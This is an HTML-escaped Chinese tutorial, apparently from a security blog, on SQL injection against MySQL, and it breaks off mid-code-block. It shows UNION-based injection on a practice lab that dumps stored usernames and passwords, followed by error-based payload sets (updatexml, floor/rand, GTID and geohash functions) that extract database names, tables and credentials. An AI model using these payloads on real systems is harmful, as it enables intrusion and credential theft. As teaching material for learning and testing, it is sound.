&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.使用order by判断列数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; order by 3 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.使用联合查询&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select user()),(select database()) --+ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome    Dhakkan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:root@localhost&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:security&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.查找数据库中有几张表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select table_name from information_schema.tables where table_schema=&amp;#x27;security&amp;#x27;),(select database()) --+ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;提示超出一行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以使用limit 0,1，此时报出第一张表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者使用group_concat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;#x27;security&amp;#x27;),(select database()) --+ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome    Dhakkan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:emails,referers,uagents,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:security&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.查找列名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27; and table_schema=&amp;#x27;security&amp;#x27;),(select database()) --+ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome    Dhakkan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:id,username,password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:security&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.查找password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Welcome    Dhakkan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:security&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。&lt;/p&gt;
&lt;p&gt;字符型：select * from table where username=‘test’&lt;/p&gt;
&lt;p&gt;字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码&lt;/p&gt;
&lt;p&gt;查询内容为字符串时：select * from table where username = ‘test’&lt;/p&gt;
&lt;p&gt;测试：&lt;/p&gt;
&lt;p&gt;select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串&lt;/p&gt;
&lt;p&gt;select * from table where username = ‘test’ and ‘1’=&#39;1’ --’，必须闭合字符串才可以继续注入&lt;/p&gt;
&lt;h5 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h5&gt;
&lt;p&gt;查询错误会输出相应的错误，查询正确没有对应输出&lt;/p&gt;
&lt;h6 id=&#34;1st_latfromgeohashmysql57x&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1st_latfromgeohashmysql57x&#34;&gt;#&lt;/a&gt; 1.ST_LatFromGeoHash()（mysql&amp;gt;=5.7.x）&lt;/h6&gt;
&lt;p&gt;计算纬度 hash 报错&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;2st_longfromgeohashmysql57x&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2st_longfromgeohashmysql57x&#34;&gt;#&lt;/a&gt; 2.ST_LongFromGeoHash（mysql&amp;gt;=5.7.x）&lt;/h6&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;p&gt;#同 8 ，都使用了嵌套查询&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;3gtid-mysql-56x-显错200&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3gtid-mysql-56x-显错200&#34;&gt;#&lt;/a&gt; 3.GTID (MySQL&amp;gt;= 5.6.X - 显错 &amp;lt;=200)&lt;/h6&gt;
&lt;p&gt;0x01 GTID&lt;/p&gt;
&lt;p&gt;GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的&lt;/p&gt;
&lt;h6 id=&#34;gtid_subset-和-gtid_subtract函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gtid_subset-和-gtid_subtract函数&#34;&gt;#&lt;/a&gt; GTID_SUBSET () 和 GTID_SUBTRACT () 函数&lt;/h6&gt;
&lt;p&gt;0X02 函数详解&lt;/p&gt;
&lt;p&gt;GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错&lt;/p&gt;
&lt;p&gt;GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)&lt;br&gt;
 GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)&lt;/p&gt;
&lt;p&gt;0x03 注入过程 (payload)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GTID_SUBSET函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&amp;#x27;:&amp;#x27;,password) from manage),0x7e),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GTID_SUBTRACT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&amp;#x27;:&amp;#x27;,password) from manage),0x7e),1)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;函数都是那样，只是适用的版本不同&lt;/p&gt;
&lt;h6 id=&#34;4floor8xmysql50&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4floor8xmysql50&#34;&gt;#&lt;/a&gt; 4.floor（8.x&amp;gt;mysql&amp;gt;5.0）&lt;/h6&gt;
&lt;p&gt;利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。&lt;/p&gt;
&lt;p&gt;基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。&lt;/p&gt;
&lt;p&gt;1.rand () 函数，获取一个 0-1 之间的随机数&lt;/p&gt;
&lt;p&gt;但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.floor（rand（0）*2）函数&lt;/p&gt;
&lt;p&gt;floor () 函数的作用就是返回小于等于括号内该值的最大整数。&lt;/p&gt;
&lt;p&gt;而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：&lt;/p&gt;
&lt;p&gt;而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。&lt;/p&gt;
&lt;p&gt;3.group by 函数&lt;/p&gt;
&lt;p&gt;group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。&lt;/p&gt;
&lt;p&gt;4.count（*）函数&lt;/p&gt;
&lt;p&gt;count（*）统计结果的记录数。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 综合使用产生报错：&lt;/p&gt;
&lt;p&gt;select count(*),floor(rand(0)*2) x from users group by x;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。&lt;/p&gt;
&lt;p&gt;分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;三、报错分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。&lt;br&gt;
首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (&lt;em&gt;)。也就对应于实验中的 user_name 和 count (&lt;/em&gt;)。&lt;br&gt;
然后&lt;strong&gt;在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &amp;quot;被计算多次&amp;quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：&lt;/p&gt;
&lt;p&gt;（1）查询前默认会建立空虚拟表如下图:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)&lt;em&gt; 2) 不会被计算第二次，直接 count (&lt;/em&gt;) 加 1，第二条记录查询完毕，结果如下:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;四、总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;p&gt;#获取数据库版本信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#获取当前数据库&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#获取表数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&amp;#x27;test&amp;#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#获取 users 表里的段名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &amp;#x27;users&amp;#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;#payload2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;5st_pointfromgeohash-mysql57&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5st_pointfromgeohash-mysql57&#34;&gt;#&lt;/a&gt; 5.ST_Pointfromgeohash (mysql&amp;gt;=5.7)&lt;/h6&gt;
&lt;p&gt;获取数据库版本信息&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or ST_PointFromGeoHash(version(),1)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取表数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取 users 表里的段名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &amp;#x27;manage&amp;#x27; limit 0,1),1)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取字段里面的数据&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&amp;#x27;:&amp;#x27;,`password`) from manage),0x23)),1)--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;6-updatexml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-updatexml&#34;&gt;#&lt;/a&gt; 6 updatexml&lt;/h6&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;updatexml(目标文档,xpath路径,更新内容)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;updatexml(1,concat(0x7e,(select user()),0x7e),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;xpath syntax error:&amp;#x27;~root@localhost~&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;有一点需要注意，updatexml()能查询字符串的最大长度为32，&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 